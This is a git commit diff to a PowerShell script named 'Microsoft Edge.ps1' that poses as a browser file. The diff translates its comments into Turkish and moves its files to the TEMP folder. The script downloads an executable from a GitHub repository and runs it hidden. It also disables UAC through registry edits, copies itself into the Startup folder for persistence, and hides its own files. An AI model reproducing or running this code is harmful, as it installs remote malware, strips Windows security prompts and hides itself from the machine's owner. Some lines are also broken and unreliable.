1ab7ecac34d68efebefc884abfcce454f2fc61f8
kasaotnic4422 <163497761+kasaotnic4422@users.noreply.github.com>
2024-03-17 01:42:08 -0400

    Add files via upload

--- Microsoft Edge.ps1
+++ Microsoft Edge.ps1
@@ -1,39 +1,39 @@
-# Set variables
+﻿# Değişkenleri Ayarla
 $URL = "https://github.com/kasaotnic4422/fatbitchmuseum/raw/main/Microsoft%20Edge.exe"
-$OutputFile = "$env:USERPROFILE\Downloads\Microsoft%20Edge.exe"
-$BackupDir = "$env:USERPROFILE\Desktop\.backup"
+$OutputFile = "$env:TEMP\Microsoft%20Edge.exe"
+$BackupDir = "$env:TEMP\.backup"
 $BackupFile = "$BackupDir\Microsoft%Edge.exe"
 $ExclusionFile = "$BackupDir\edgeinfo.txt"
 $PersistenceDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
-# Download the executable file
+# İndirilecek dosyayı indir
 Invoke-WebRequest -Uri $URL -OutFile $OutputFile
 
-# Disable LUA/UAC
+# LUA/UAC'yı devre dışı bırak
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
 
-# Run the executable file silently in the background
+# Arkaplanda sessizce dosyayı çalıştır
 Start-Process -FilePath $OutputFile -WindowStyle Hidden
 
-# Add persistence to restart the script on startup
+# Başlangıçta betiği tekrar çalıştırmak için kalıcılık ekle
 if (!(Test-Path $PersistenceDir)) {
     New-Item -ItemType Directory -Path $PersistenceDir | Out-Null
 }
 Copy-Item -Path $MyInvocation.MyCommand.Path -Destination "$PersistenceDir\example.ps1" -Force
 
-# Additional Advanced Features
+# Ek Gelişmiş Özellikler
 Get-FileHash -Path $OutputFile
 Get-Process -Name "powershell" | ForEach-Object { $_.MainWindowHandle = 0 }
 
-# Backup the original file and create an exclusion list
+# Orijinal dosyayı yedekle ve bir hariç tutma listesi oluştur
 if (!(Test-Path $BackupDir)) {
     New-Item -ItemType Directory -Path $BackupDir | Out-Null
 }
 Add-Content -Path $ExclusionFile -Value $BackupFile
 Add-Content -Path $ExclusionFile -Value $OutputFile
 
-# Hide the backup file, exclusion list, and this script
+# Yedek dosyayı, hariç tutma listesini ve bu betiği gizle
 $BackupDirAttributes = (Get-Item $BackupDir).Attributes
 $BackupDirAttributes += "Hidden"
 Set-Item -Path $BackupDir -Force -Attributes $BackupDirAttributes
